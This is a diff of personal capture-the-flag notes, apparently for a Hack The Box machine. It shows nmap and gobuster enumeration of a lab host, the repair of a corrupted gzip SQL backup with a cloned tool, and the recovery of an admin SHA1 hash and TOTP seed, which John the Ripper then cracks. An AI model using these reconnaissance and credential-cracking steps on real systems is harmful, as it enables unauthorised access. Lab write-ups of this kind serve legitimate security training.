@@ -1,4 +1,5 @@
 ## Nmap scan
+```bash
 nmap -sC -sV -A -T4 10.129.186.91 -oN nmap.txt 
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 20:18 IST
 Nmap scan report for 10.129.186.91
@@ -34,4 +35,121 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 47.75 seconds
 
+```
 
+gobuster dir -u http://10.129.186.91:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.186.91:8080/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+2021/12/06 20:29:46 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 0]
+/robots.txt           (Status: 200) [Size: 55]
+
+
+# git clone https://github.com/yonjar/fixgz.git
+Cloning into 'fixgz'...
+remote: Enumerating objects: 10, done.
+remote: Counting objects: 100% (10/10), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (10/10), 9.19 KiB | 4.60 MiB/s, done.
+Resolving deltas: 100% (1/1), done.
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www]
+└─# cd fixgz 
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# ls -la               
+total 44
+drwxr-xr-x 3 root root  4096 Dec  6 20:34 .
+drwxr-xr-x 3 root root  4096 Dec  6 20:34 ..
+-rw-r--r-- 1 root root  1394 Dec  6 20:34 fixgz.cpp
+-rw-r--r-- 1 root root 22763 Dec  6 20:34 fixgz.exe
+drwxr-xr-x 8 root root  4096 Dec  6 20:34 .git
+-rw-r--r-- 1 root root   135 Dec  6 20:34 README.md
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# g++ fixgz.cpp -o fixgz
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# ls -la
+total 60
+drwxr-xr-x 3 root root  4096 Dec  6 20:34 .
+drwxr-xr-x 3 root root  4096 Dec  6 20:34 ..
+-rwxr-xr-x 1 root root 16336 Dec  6 20:34 fixgz
+-rw-r--r-- 1 root root  1394 Dec  6 20:34 fixgz.cpp
+-rw-r--r-- 1 root root 22763 Dec  6 20:34 fixgz.exe
+drwxr-xr-x 8 root root  4096 Dec  6 20:34 .git
+-rw-r--r-- 1 root root   135 Dec  6 20:34 README.md
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# ./fixgz db.sql.gz db.gz                                                                                                  
+fixgz: cannot open db.sql.gz
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# ./fixgz db.sql.gz db.gz                                                                                                                                                                                                            1 ⨯
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# ls -la
+total 68
+drwxr-xr-x 3 root root  4096 Dec  6 20:37 .
+drwxr-xr-x 3 root root  4096 Dec  6 20:37 ..
+-rw-r--r-- 1 root root   258 Dec  6 20:37 db.gz
+-rw-r--r-- 1 root root   262 Dec  6 20:36 db.sql.gz
+-rwxr-xr-x 1 root root 16336 Dec  6 20:34 fixgz
+-rw-r--r-- 1 root root  1394 Dec  6 20:34 fixgz.cpp
+-rw-r--r-- 1 root root 22763 Dec  6 20:34 fixgz.exe
+drwxr-xr-x 8 root root  4096 Dec  6 20:34 .git
+-rw-r--r-- 1 root root   135 Dec  6 20:34 README.md
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# cat db
+cat: db: No such file or directory
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# gunzip db.gz                                                                                                                                                                                                                       1 ⨯
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# cat db      
+CREATE DATABASE static;
+USE static;
+CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
+INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
+
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# nvim hash
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
+└─# john hash
+Created directory: /root/.john
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
+Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
+Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
+Use the "--format=ripemd-160" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
+Use the "--format=has-160" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=16
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+admin            (?)     
+1g 0:00:00:00 DONE 2/3 (2021-12-06 20:40) 100.0g/s 282400p/s 282400c/s 282400C/s Winnie..admin1
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed.
